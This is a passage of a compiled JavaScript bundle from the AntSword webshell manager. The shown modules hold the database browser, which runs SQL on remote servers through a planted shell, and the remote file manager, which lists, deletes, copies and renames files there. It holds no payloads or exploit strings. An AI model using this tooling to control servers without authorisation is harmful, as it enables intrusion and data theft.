	      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAPCAQAAABHeoekAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAAASwAAAEsAHOI6VIAAAB1SURBVBjTY2TYyrCbATcwY2CoYsAHElgYWBjYkAT+MzAwMCLxWRgZtjHsQRIQYGBmeIvEN2VhOMswD0nAiYGXYSOcx8jwk4XhO8MHJAWfGBhQ+F+Z0BzFiM5HV4ABhoiC/yj8f+h8FgYNBh8kAQMGLobfyHwAyM8UUNk8qsEAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTUtMDctMjVUMjE6NDk6MzYrMDg6MDCNdDHDAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE0LTEyLTE5VDE4OjU2OjEyKzA4OjAwOU9bHwAAAE50RVh0c29mdHdhcmUASW1hZ2VNYWdpY2sgNi44LjgtMTAgUTE2IHg4Nl82NCAyMDE1LTA3LTE5IGh0dHA6Ly93d3cuaW1hZ2VtYWdpY2sub3JnBQycNQAAAGN0RVh0c3ZnOmNvbW1lbnQAIEdlbmVyYXRvcjogQWRvYmUgSWxsdXN0cmF0b3IgMTYuMC4wLCBTVkcgRXhwb3J0IFBsdWctSW4gLiBTVkcgVmVyc2lvbjogNi4wMCBCdWlsZCAwKSAgcgt1lgAAABh0RVh0VGh1bWI6OkRvY3VtZW50OjpQYWdlcwAxp/+7LwAAABh0RVh0VGh1bWI6OkltYWdlOjpIZWlnaHQAMjY1W+dGYAAAABd0RVh0VGh1bWI6OkltYWdlOjpXaWR0aAAyNjZRH0eHAAAAGXRFWHRUaHVtYjo6TWltZXR5cGUAaW1hZ2UvcG5nP7JWTgAAABd0RVh0VGh1bWI6Ok1UaW1lADE0MTg5ODY1NzJGLGnJAAAAE3RFWHRUaHVtYjo6U2l6ZQAxLjEzS0JCW7QG7wAAAFp0RVh0VGh1bWI6OlVSSQBmaWxlOi8vL2hvbWUvd3d3cm9vdC93d3cuZWFzeWljb24ubmV0L2Nkbi1pbWcuZWFzeWljb24uY24vc3JjLzExODMwLzExODMwMjcucG5nOFxJnwAAAABJRU5ErkJggg=='];

	      // 左侧拦toolbar
	      var toolbar = layout.attachToolbar();
	      toolbar.loadStruct([{ id: 'add', text: LANG['list']['add'], icon: 'plus-circle', type: 'button' },
	      // { type: 'separator' },
	      // { id: 'edit', text: '编辑', icon: 'edit', type: 'button', disabled: true },
	      { type: 'separator' }, { id: 'del', text: LANG['list']['del'], icon: 'trash-o', type: 'button', disabled: true }]);
	      toolbar.attachEvent('onClick', function (id) {
	        switch (id) {
	          case 'add':
	            _this.drive.addConf();
	            break;
	          case 'del':
	            _this.drive.delConf();
	            break;
	          // case 'edit':
	          //   this.drive.editConf();
	          //   break;
	        }
	      });
	      return {
	        imgs: imgs,
	        layout: layout,
	        toolbar: toolbar
	      };
	    }

	    // 初始化右侧::SQL执行

	  }, {
	    key: 'initQuery',
	    value: function initQuery(layout) {
	      var _this2 = this;

	      layout.setText('<i class="fa fa-code"></i> ' + LANG['query']['title']);
	      layout.setHeight('200');

	      var editor = void 0;
	      // SQL语句toolbar
	      var toolbar = layout.attachToolbar();
	      toolbar.loadStruct([{ id: 'exec', text: LANG['query']['exec'], icon: 'play', type: 'button', disabled: true },
	      // { type: 'separator' },
	      // { id: 'import', text: '导入', icon: 'download', type: 'button' },
	      { type: 'separator' }, { id: 'clear', text: LANG['query']['clear'], icon: 'remove', type: 'button' }]);

	      toolbar.attachEvent('onClick', function (id) {
	        switch (id) {
	          case 'clear':
	            editor.session.setValue('');
	            break;
	          case 'exec':
	            _this2.drive.execSQL(editor.session.getValue());
	            break;
	        }
	      });

	      // SQL语句编辑器
	      editor = ace.edit(layout.cell.lastChild);
	      editor.$blockScrolling = Infinity;
	      editor.setTheme('ace/theme/tomorrow');
	      editor.session.setMode('ace/mode/sql');
	      editor.session.setUseWrapMode(true);
	      editor.session.setWrapLimitRange(null, null);

	      editor.setOptions({
	        fontSize: '14px',
	        enableBasicAutocompletion: true,
	        enableSnippets: true,
	        enableLiveAutocompletion: true
	      });

	      // 快捷键
	      editor.commands.addCommand({
	        name: 'exec',
	        bindKey: {
	          win: 'Ctrl-E',
	          mac: 'Command-E'
	        },
	        exec: function exec() {
	          toolbar.callEvent('onClick', ['exec']);
	        }
	      });

	      editor.session.setValue('SELECT "Hello antSword :)" AS welcome;');

	      return {
	        editor: editor,
	        layout: layout,
	        toolbar: toolbar
	      };
	    }

	    // 初始化右侧::执行结果

	  }, {
	    key: 'initResult',
	    value: function initResult(layout) {
	      layout.setText('<i class="fa fa-inbox"></i> ' + LANG['result']['title']);
	      // layout.hideHeader();

	      // const toolbar = layout.attachToolbar();
	      // toolbar.loadStruct([
	      //   { id: 'dump', text: '导出', icon: 'upload', type: 'button', disabled: true },
	      //   { type: 'separator' }
	      // ]);
	      return {
	        layout: layout
	      };
	    }

	    // 创建窗口

	  }, {
	    key: 'createWin',
	    // toolbar: toolbar
	    value: function createWin(opts) {
	      var hash = (+new Date() * Math.random()).toString(16).substr(2, 8);
	      // 默认配置
	      var opt = $.extend({
	        title: 'Window:' + hash,
	        width: 550,
	        height: 450
	      }, opts);

	      // 创建窗口
	      var _win = this.win.createWindow(hash, 0, 0, opt['width'], opt['height']);
	      _win.setText(opt['title']);
	      _win.centerOnScreen();
	      _win.button('minmax').show();
	      _win.button('minmax').enable();

	      // 返回窗口对象
	      return _win;
	    }
	  }]);

	  return Database;
	}();

	exports.default = Database;

/***/ },
/* 78 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./asp/index": 74,
		"./aspx/index": 75,
		"./custom/index": 76,
		"./php/index": 79
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 78;


/***/ },
/* 79 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {'use strict';

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	//
	// 数据库驱动::PHP
	// 支持数据库:mysql,mssql,oracle,informix
	//

	var LANG = antSword['language']['database'];
	var LANG_T = antSword['language']['toastr'];

	var PHP = function () {
	  function PHP(opt) {
	    var _this = this;

	    _classCallCheck(this, PHP);

	    this.opt = opt;
	    this.core = this.opt.core;
	    this.manager = this.opt.super;
	    // 1. 初始化TREE UI
	    this.tree = this.manager.list.layout.attachTree();
	    // 2. 加载数据库配置
	    this.parse();
	    // 3. tree单击::设置当前配置&&激活按钮
	    this.tree.attachEvent('onClick', function (id) {
	      // 更改按钮状态
	      id.startsWith('conn::') ? _this.enableToolbar() : _this.disableToolbar();
	      // 设置当前配置
	      var tmp = id.split('::');
	      var arr = tmp[1].split(':');
	      // 设置当前数据库
	      _this.dbconf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: _this.manager.opt['_id'],
	        id: arr[0]
	      });
	      if (arr.length > 1) {
	        _this.dbconf['database'] = new Buffer(arr[1], 'base64').toString();
	        // 更新SQL编辑器
	        _this.enableEditor();
	        // manager.query.update(this.currentConf);
	      } else {
	          _this.disableEditor();
	        }
	    });
	    // 4. tree双击::加载库/表/字段
	    this.tree.attachEvent('onDblClick', function (id) {
	      var arr = id.split('::');
	      if (arr.length < 2) {
	        throw new Error('ID ERR: ' + id);
	      };

	      switch (arr[0]) {
	        // 获取数据库列表
	        case 'conn':
	          _this.getDatabases(arr[1]);
	          break;
	        // 获取数据库表名
	        case 'database':
	          var _db = arr[1].split(':');
	          _this.getTables(_db[0], new Buffer(_db[1], 'base64').toString());
	          break;
	        // 获取表名字段
	        case 'table':
	          var _tb = arr[1].split(':');
	          _this.getColumns(_tb[0], new Buffer(_tb[1], 'base64').toString(), new Buffer(_tb[2], 'base64').toString());
	          break;
	        // 生成查询SQL语句
	        case 'column':
	          var _co = arr[1].split(':');
	          var table = new Buffer(_co[2], 'base64').toString();
	          var column = new Buffer(_co[3], 'base64').toString();

	          var sql = 'SELECT `' + column + '` FROM `' + table + '` ORDER BY 1 DESC LIMIT 0,20;';
	          _this.manager.query.editor.session.setValue(sql);
	          break;
	      }
	    });
	    // 5. tree右键::功能菜单
	    this.tree.attachEvent('onRightClick', function (id, event) {
	      if (!id.startsWith('conn::')) {
	        return;
	      };
	      _this.tree.selectItem(id);
	      _this.tree.callEvent('onClick', [id]);
	      bmenu([{
	        text: LANG['list']['menu']['add'],
	        icon: 'fa fa-plus-circle',
	        action: _this.addConf.bind(_this)
	      }, {
	        divider: true
	      }, {
	        text: LANG['list']['menu']['del'],
	        icon: 'fa fa-remove',
	        action: _this.delConf.bind(_this)
	      }], event);
	    });
	  }

	  // 加载配置列表


	  _createClass(PHP, [{
	    key: 'parse',
	    value: function parse() {
	      // 获取数据
	      var info = antSword['ipcRenderer'].sendSync('shell-findOne', this.manager.opt['_id']);
	      var conf = info['database'] || {};
	      // 刷新UI
	      // 1.清空数据
	      this.tree.deleteChildItems(0);
	      // 2.添加数据
	      var items = [];
	      for (var _ in conf) {
	        items.push({
	          id: 'conn::' + _,
	          text: conf[_]['type'] + '://' + conf[_]['user'] + '@' + conf[_]['host'],
	          im0: this.manager.list.imgs[0],
	          im1: this.manager.list.imgs[0],
	          im2: this.manager.list.imgs[0]
	        });
	      }
	      // 3.刷新UI
	      this.tree.parse({
	        id: 0,
	        item: items
	      }, 'json');
	      // 禁用按钮
	      this.disableToolbar();
	      this.disableEditor();
	    }

	    // 添加配置

	  }, {
	    key: 'addConf',
	    value: function addConf() {
	      var _this2 = this;

	      var hash = (+new Date() * Math.random()).toString(16).substr(2, 8);
	      // 创建窗口
	      var win = this.manager.win.createWindow(hash, 0, 0, 450, 300);
	      win.setText(LANG['form']['title']);
	      win.centerOnScreen();
	      win.button('minmax').hide();
	      win.setModal(true);
	      win.denyResize();
	      // 工具栏
	      var toolbar = win.attachToolbar();
	      toolbar.loadStruct([{
	        id: 'add',
	        type: 'button',
	        icon: 'plus-circle',
	        text: LANG['form']['toolbar']['add']
	      }, {
	        type: 'separator'
	      }, {
	        id: 'clear',
	        type: 'button',
	        icon: 'remove',
	        text: LANG['form']['toolbar']['clear']
	      }]);

	      // form
	      var form = win.attachForm([{ type: 'settings', position: 'label-left', labelWidth: 90, inputWidth: 250 }, { type: 'block', inputWidth: 'auto', offsetTop: 12, list: [{ type: 'combo', label: LANG['form']['type'], readonly: true, name: 'type', options: [{ text: 'MYSQL', value: 'mysql', list: [{ type: 'settings', position: 'label-left', offsetLeft: 70, labelWidth: 90, inputWidth: 150 }, { type: 'label', label: LANG['form']['encode'] }, { type: 'combo', label: '', name: 'encode', options: function () {
	                var ret = [];
	                ['utf8', 'big5', 'dec8', 'cp850', 'hp8', 'koi8r', 'latin1', 'latin2', 'ascii', 'euckr', 'gb2312', 'gbk'].map(function (_) {
	                  ret.push({
	                    text: _,
	                    value: _
	                  });
	                });
	                return ret;
	              }() }] }, { text: 'MSSQL', value: 'mssql' }, { text: 'ORACLE', value: 'oracle' }, { text: 'INFORMIX', value: 'informix' }] }, { type: 'input', label: LANG['form']['host'], name: 'host', required: true, value: 'localhost' }, { type: 'input', label: LANG['form']['user'], name: 'user', required: true, value: 'root' }, { type: 'input', label: LANG['form']['passwd'], name: 'passwd', value: '' }] }], true);

	      form.attachEvent('onChange', function (_, id) {
	        if (_ !== 'type') {
	          return;
	        };
	        switch (id) {
	          case 'mysql':
	            form.setFormData({
	              user: 'root',
	              passwd: ''
	            });
	            break;
	          case 'mssql':
	            form.setFormData({
	              user: 'sa',
	              passwd: ''
	            });
	            break;
	          default:
	            form.setFormData({
	              user: 'dbuser',
	              passwd: 'dbpwd'
	            });
	        }
	      });

	      // 工具栏点击事件
	      toolbar.attachEvent('onClick', function (id) {
	        switch (id) {
	          case 'clear':
	            form.clear();
	            break;
	          case 'add':
	            if (!form.validate()) {
	              return toastr.warning(LANG['form']['warning'], LANG_T['warning']);
	            };
	            // 解析数据
	            var data = form.getValues();
	            // 验证是否连接成功(获取数据库列表)
	            var id = antSword['ipcRenderer'].sendSync('shell-addDataConf', {
	              _id: _this2.manager.opt['_id'],
	              data: data
	            });
	            win.close();
	            toastr.success(LANG['form']['success'], LANG_T['success']);
	            _this2.tree.insertNewItem(0, 'conn::' + id, data['type'] + '://' + data['user'] + '@' + data['host'], null, _this2.manager.list.imgs[0], _this2.manager.list.imgs[0], _this2.manager.list.imgs[0]);
	            break;
	        }
	      });
	    }

	    // 删除配置

	  }, {
	    key: 'delConf',
	    value: function delConf() {
	      var _this3 = this;

	      var id = this.tree.getSelected().split('::')[1];
	      layer.confirm(LANG['form']['del']['confirm'], {
	        icon: 2, shift: 6,
	        title: LANG['form']['del']['title']
	      }, function (_) {
	        layer.close(_);
	        var ret = antSword['ipcRenderer'].sendSync('shell-delDataConf', {
	          _id: _this3.manager.opt['_id'],
	          id: id
	        });
	        if (ret === 1) {
	          toastr.success(LANG['form']['del']['success'], LANG_T['success']);
	          _this3.tree.deleteItem('conn::' + id);
	          // 禁用按钮
	          _this3.disableToolbar();
	          _this3.disableEditor();
	          // ['edit', 'del'].map(this.toolbar::this.toolbar.disableItem);
	          // this.parse();
	        } else {
	            toastr.error(LANG['form']['del']['error'](ret), LANG_T['error']);
	          }
	      });
	    }

	    // 获取数据库列表

	  }, {
	    key: 'getDatabases',
	    value: function getDatabases(id) {
	      var _this4 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_databases({
	        host: conf['host'],
	        user: conf['user'],
	        passwd: conf['passwd']
	      }, function (ret) {
	        var arr = ret.split('\t');
	        if (arr.length === 1 && ret === '') {
	          toastr.warning(LANG['result']['warning'], LANG_T['warning']);
	          return _this4.manager.list.layout.progressOff();
	        };
	        // 删除子节点
	        _this4.tree.deleteChildItems('conn::' + id);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _db = new Buffer(_).toString('base64');
	          _this4.tree.insertNewItem('conn::' + id, 'database::' + id + ':' + _db, _, null, _this4.manager.list.imgs[1], _this4.manager.list.imgs[1], _this4.manager.list.imgs[1]);
	        });
	        _this4.manager.list.layout.progressOff();
	      }, function (err) {
	        toastr.error(LANG['result']['error']['database'](err['status'] || JSON.stringify(err)), LANG_T['error']);
	        _this4.manager.list.layout.progressOff();
	      });
	    }

	    // 获取数据库表数据

	  }, {
	    key: 'getTables',
	    value: function getTables(id, db) {
	      var _this5 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_tables({
	        host: conf['host'],
	        user: conf['user'],
	        passwd: conf['passwd'],
	        db: db
	      }, function (ret) {
	        var arr = ret.split('\t');
	        var _db = new Buffer(db).toString('base64');
	        // 删除子节点
	        _this5.tree.deleteChildItems('database::' + id + ':' + _db);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _table = new Buffer(_).toString('base64');
	          _this5.tree.insertNewItem('database::' + id + ':' + _db, 'table::' + id + ':' + _db + ':' + _table, _, null, _this5.manager.list.imgs[2], _this5.manager.list.imgs[2], _this5.manager.list.imgs[2]);
	        });
	        _this5.manager.list.layout.progressOff();
	      }, function (err) {
	        toastr.error(LANG['result']['error']['table'](err['status'] || JSON.stringify(err)), LANG_T['error']);
	        _this5.manager.list.layout.progressOff();
	      });
	    }

	    // 获取字段

	  }, {
	    key: 'getColumns',
	    value: function getColumns(id, db, table) {
	      var _this6 = this;

	      this.manager.list.layout.progressOn();
	      // 获取配置
	      var conf = antSword['ipcRenderer'].sendSync('shell-getDataConf', {
	        _id: this.manager.opt['_id'],
	        id: id
	      });
	      this.core['database_' + conf['type']].show_columns({
	        host: conf['host'],
	        user: conf['user'],
	        passwd: conf['passwd'],
	        db: db,
	        table: table
	      }, function (ret) {
	        var arr = ret.split('\t');
	        var _db = new Buffer(db).toString('base64');
	        var _table = new Buffer(table).toString('base64');
	        // 删除子节点
	        _this6.tree.deleteChildItems('table::' + id + ':' + _db + ':' + _table);
	        // 添加子节点
	        arr.map(function (_) {
	          if (!_) {
	            return;
	          };
	          var _column = new Buffer(_.split(' ')[0]).toString('base64');
	          _this6.tree.insertNewItem('table::' + id + ':' + _db + ':' + _table, 'column::' + id + ':' + _db + ':' + _table + ':' + _column, _, null, _this6.manager.list.imgs[3], _this6.manager.list.imgs[3], _this6.manager.list.imgs[3]);
	        });
	        // 更新编辑器SQL语句
	        _this6.manager.query.editor.session.setValue('SELECT * FROM `' + table + '` ORDER BY 1 DESC LIMIT 0,20;');
	        _this6.manager.list.layout.progressOff();
	      }, function (err) {
	        toastr.error(LANG['result']['error']['column'](err['status'] || JSON.stringify(err)), LANG_T['error']);
	        _this6.manager.list.layout.progressOff();
	      });
	    }

	    // 执行SQL

	  }, {
	    key: 'execSQL',
	    value: function execSQL(sql) {
	      var _this7 = this;

	      this.manager.query.layout.progressOn();
	      this.core['database_' + this.dbconf['type']].query({
	        host: this.dbconf['host'],
	        user: this.dbconf['user'],
	        passwd: this.dbconf['passwd'],
	        db: this.dbconf['database'],
	        sql: sql,
	        encode: this.dbconf['encode'] || 'utf8'
	      }, function (ret) {
	        // 更新执行结果
	        _this7.updateResult(ret);
	        _this7.manager.query.layout.progressOff();
	      }, function (err) {
	        toastr.error(LANG['result']['error']['query'](err['status'] || JSON.stringify(err)), LANG_T['error']);
	        _this7.manager.query.layout.progressOff();
	      });
	    }

	    // 更新SQL执行结果

	  }, {
	    key: 'updateResult',
	    value: function updateResult(data) {
	      // 1.分割数组
	      var arr = data.split('\n');
	      // 2.判断数据
	      if (arr.length < 2) {
	        return toastr.error(LANG['result']['error']['parse'], LANG_T['error']);
	      };
	      // 3.行头
	      var header_arr = arr[0].split('\t|\t');
	      if (header_arr.length === 1) {
	        return toastr.warning(LANG['result']['error']['noresult'], LANG_T['warning']);
	      };
	      if (header_arr[header_arr.length - 1] === '\r') {
	        header_arr.pop();
	      };
	      arr.shift();
	      // 4.数据
	      var data_arr = [];
	      arr.map(function (_) {
	        var _data = _.split('\t|\t');
	        data_arr.push(_data);
	      });
	      data_arr.pop();
	      // 5.初始化表格
	      var grid = this.manager.result.layout.attachGrid();
	      grid.clearAll();
	      grid.setHeader(header_arr.join(',').replace(/,$/, ''));
	      grid.setColSorting('str,'.repeat(header_arr.length).replace(/,$/, ''));
	      grid.setInitWidths('*');
	      grid.setEditable(true);
	      grid.init();
	      // 添加数据
	      var grid_data = [];
	      for (var i = 0; i < data_arr.length; i++) {
	        grid_data.push({
	          id: i + 1,
	          data: data_arr[i]
	        });
	      }
	      grid.parse({
	        'rows': grid_data
	      }, 'json');
	      // 启用导出按钮
	      // this.manager.result.toolbar[grid_data.length > 0 ? 'enableItem' : 'disableItem']('dump');
	    }

	    // 禁用toolbar按钮

	  }, {
	    key: 'disableToolbar',
	    value: function disableToolbar() {
	      this.manager.list.toolbar.disableItem('del');
	    }

	    // 启用toolbar按钮

	  }, {
	    key: 'enableToolbar',
	    value: function enableToolbar() {
	      this.manager.list.toolbar.enableItem('del');
	    }

	    // 禁用SQL编辑框

	  }, {
	    key: 'disableEditor',
	    value: function disableEditor() {
	      var _context;

	      ['exec', 'clear'].map((_context = this.manager.query.toolbar, this.manager.query.toolbar.disableItem).bind(_context));
	      this.manager.query.editor.setReadOnly(true);
	    }

	    // 启用SQL编辑框

	  }, {
	    key: 'enableEditor',
	    value: function enableEditor() {
	      var _context2;

	      ['exec', 'clear'].map((_context2 = this.manager.query.toolbar, this.manager.query.toolbar.enableItem).bind(_context2));
	      this.manager.query.editor.setReadOnly(false);
	    }
	  }]);

	  return PHP;
	}();

	module.exports = PHP;
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 80 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(global, Buffer) {'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol ? "symbol" : typeof obj; };

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); //
	// 文件管理模块
	//

	var _files = __webpack_require__(81);

	var _files2 = _interopRequireDefault(_files);

	var _tasks = __webpack_require__(82);

	var _tasks2 = _interopRequireDefault(_tasks);

	var _folder = __webpack_require__(83);

	var _folder2 = _interopRequireDefault(_folder);

	var _encodes = __webpack_require__(84);

	var _encodes2 = _interopRequireDefault(_encodes);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var fs = global.require('fs');
	var iconv = global.require('iconv-lite');
	var crypto = global.require('crypto');
	var remote = global.require('remote');
	var dialog = remote.require('dialog');

	// 加载语言模板
	var LANG = antSword['language']['filemanager'];
	var LANG_T = antSword['language']['toastr'];

	var FileManager = function () {
	  function FileManager(opts) {
	    var _this = this;

	    _classCallCheck(this, FileManager);

	    var tabbar = antSword['tabbar'];
	    var hash = String(Math.random()).substr(2, 10);

	    tabbar.addTab('tab_filemanager_' + hash,
	    // `<i class="fa fa-folder-o"></i> ${LANG['title']} \/\/ ${opts['ip']}`,
	    '<i class="fa fa-folder-o"></i> ' + opts['ip'], null, null, true, true);

	    // 创建框架
	    var cell = tabbar.cells('tab_filemanager_' + hash);

	    this.isWin = true;
	    this.path = '/';
	    this.home = '/';
	    this.devices = [];
	    // this.cache = {};
	    this.cell = cell;
	    this.opts = opts;
	    this.cache = new antSword['CacheManager'](opts['_id']);
	    this.core = new antSword['core'][opts['type']](opts);
	    this.win = new dhtmlXWindows();
	    this.win.attachViewportTo(this.cell.cell);

	    // 获取基本信息
	    var cache_info = this.cache.get('info');
	    if (cache_info) {
	      this.initUI(cache_info);
	    } else {
	      this.cell.progressOn();
	      this.core.base.info(function (ret) {
	        _this.initUI(ret);
	        _this.cell.progressOff();
	      }, function (err) {
	        _this.cell.progressOff();
	        _this.cell.close();
	        toastr.error((typeof err === 'undefined' ? 'undefined' : _typeof(err)) === 'object' ? JSON.stringify(err) : String(err), LANG_T['error']);
	      });
	    }
	  }

	  // 初始化UI


	  _createClass(FileManager, [{
	    key: 'initUI',
	    value: function initUI(ret) {
	      var _this2 = this;

	      // 判断获取数据是否正确
	      var info = ret.split('\t');
	      if (!info.length >= 2) {
	        toastr.error('Loading infomations failed!<br/>' + ret, LANG_T['error']);
	        this.cache.del('info');
	        return this.cell.close();
	      };
	      var info_path = info[0].replace(/\\/g, '/').replace(/\.$/, '');
	      var info_drive = info[1];

	      // 判断是否为linux
	      if (info_path.substr(0, 1) === '/') {
	        this.isWin = false;
	      };
	      this.path = info_path;
	      this.home = info_path;
	      info_drive.split(':').map(function (_) {
	        if (!_) {
	          return;
	        };
	        _this2.devices.push(_ === '/' ? _ : _ + ':/');
	      });

	      // 模块对象
	      var layout = this.cell.attachLayout('3L');
	      this.folder = new _folder2.default(layout.cells('a'), this);
	      this.files = new _files2.default(layout.cells('b'), this);
	      this.tasks = new _tasks2.default(layout.cells('c'), this);

	      this.folder.cell.progressOn();
	      this.files.cell.progressOn();
	      this.getFiles(this.path, function (files) {
	        _this2.folder.parse(files);
	        _this2.files.parse(files);
	      });
	    }

	    // 本地存储
	    // storage('save_key').get('{}')
	    // storage('save_key').set('{a:123}')

	  }, {
	    key: 'storage',
	    value: function storage(key) {
	      var md5 = crypto.createHash('md5');
	      md5.update(this.opts['url']);
	      var k = md5.digest('hex').substr(0, 11) + '_' + key;
	      return {
	        get: function get(def) {
	          return localStorage.getItem(k) || def;
	        },
	        set: function set(val) {
	          return localStorage.setItem(k, val);
	        }
	      };
	    }

	    // 获取目录文件列表

	  }, {
	    key: 'getFiles',
	    value: function getFiles(p, callback) {
	      var _this3 = this;

	      var self = this;
	      var path = this.changePath(p);
	      var cache = void 0;

	      if (!path.endsWith('/')) {
	        path += '/';
	      };
	      this.path = path;
	      var cache_tag = 'filemanager-files-' + new Buffer(this.path).toString('base64');

	      // 判断是否有缓存
	      // if (cache = this.cache[path]) {
	      //   return callback(cache);
	      // };
	      if (cache = this.cache.get(cache_tag)) {
	        return callback(JSON.parse(cache));
	      };

	      this.core.filemanager.dir({
	        path: path
	      }, function (ret) {
	        // 判断是否出错
	        if (ret.startsWith('ERROR://')) {
	          callback([]);
	          return toastr.error(ret.substr(9), LANG_T['error']);
	        };
	        var tmp = ret.split('\n');

	        tmp.sort();

	        var folders = [];
	        var files = [];

	        tmp.map(function (t) {
	          var _ = t.split('\t');
	          var d = {
	            name: _[0],
	            time: _[1],
	            size: _[2],
	            attr: _[3]
	          };
	          if (_[0].endsWith('/')) {
	            folders.push(d);
	          } else {
	            files.push(d);
	          }
	        });

	        var data = folders.concat(files);
	        callback(data);

	        // 增加缓存
	        // self.cache[path] = data;
	        _this3.cache.set(cache_tag, JSON.stringify(data));
	      }, function (err) {
	        toastr.error(err instanceof Object ? JSON.stringify(err) : String(err), LANG_T['error']);
	      });
	    }

	    // 更改目录，返回最终绝对路径

	  }, {
	    key: 'changePath',
	    value: function changePath(path) {
	      if (!this.path.endsWith('/')) {
	        this.path += '/';
	      };
	      if (!path.endsWith('/')) {
	        path += '/';
	      };
	      // 如果是当前目录，返回
	      if (path === './') {
	        return this.path;
	        // 如果是上级目录，则判断是否为最后一级？返回最后一级：返回上一级
	      } else if (path === '../') {
	          var _ = this.path.split('/');
	          if (_.length === 2) {
	            return _.join('/');
	          } else if (_.length > 2) {
	            _.pop();
	            _.pop();
	            _.length === 1 ? _.push('') : 0;
	            return _.join('/');
	          } else {
	            return this.path;
	          }
	          // 如果是根目录，返回
	        } else if (path.startsWith('/') || path.substr(1, 2) === ':/') {
	            return path;
	            // 如果是相对路径，返回绝对全路径
	          } else {
	              return this.path + path;
	            }
	    }

	    // 删除文件/目录

	  }, {
	    key: 'deleteFile',
	    value: function deleteFile(files) {
	      var _this4 = this;

	      var self = this;

	      layer.confirm(LANG['delete']['confirm'](files.length > 1 ? files.length : files[0]), {
	        icon: 2,
	        shift: 6,
	        //skin: 'layui-layer-molv',
	        title: '<i class="fa fa-trash"></i> ' + LANG['delete']['title']
	      }, function (_) {
	        layer.close(_);

	        files.map(function (p) {
	          (function (p) {
	            var path = _this4.path + p;
	            _this4.files.cell.progressOn();
	            _this4.core.filemanager.delete({
	              path: path
	            }, function (ret) {
	              _this4.files.cell.progressOff();
	              if (ret === '1') {
	                toastr.success(LANG['delete']['success'](path), LANG_T['success']);
	                _this4.files.refreshPath();
	              } else {
	                toastr.error(LANG['delete']['error'](path, ret === '0' ? false : ret), LANG_T['error']);
	              }
	            }, function (err) {
	              _this4.files.cell.progressOff();
	              toastr.error(LANG['delete']['error'](path, err), LANG_T['error']);
	            });
	          })(p);
	        });
	      });
	    }

	    // 粘贴文件/文件夹
	    // source: 复制源文件/目录
	    // name: 复制文件/目录名

	  }, {
	    key: 'pasteFile',
	    value: function pasteFile(source, name) {
	      var _this5 = this;

	      var target = this.path + name;

	      this.files.cell.progressOn();
	      this.core.filemanager.copy({
	        path: source,
	        target: target
	      }, function (ret) {
	        _this5.files.cell.progressOff();
	        if (ret === '1') {
	          // 刷新目录
	          _this5.files.refreshPath();
	          // 删除缓存
	          delete _this5.files.Clipboard[name];
	          toastr.success(LANG['paste']['success'](name), LANG_T['success']);
	        } else {
	          toastr.error(LANG['paste']['error'](name, ret === '0' ? false : ret), LANG_T['error']);
	        }
	      }, function (err) {
	        toastr.error(LANG['paste']['error'](name, err), LANG_T['error']);
	      });
	    }

	    // 重命名

	  }, {
	    key: 'renameFile',
	    value: function renameFile(name) {
	      var _this6 = this;

	      var isDir = name.endsWith('/');
	      layer.prompt({
	        value: name.replace(/\/$/, ''),
	        title: '<i class="fa fa-fa fa-font"></i> ' + LANG['rename']['title'] + ' (' + name + ')'
	      }, function (value, index, elem) {
	        _this6.files.cell.progressOn();
	        _this6.core.filemanager.rename({
	          path: _this6.path + name,
	          name: _this6.path + value + (isDir && !value.endsWith('/') ? '/' : '')
	        }, function (ret) {
	          _this6.files.cell.progressOff();
	          if (ret === '1') {
	            _this6.files.refreshPath();
	            toastr.success(LANG['rename']['success'], LANG_T['success']);
	          } else {
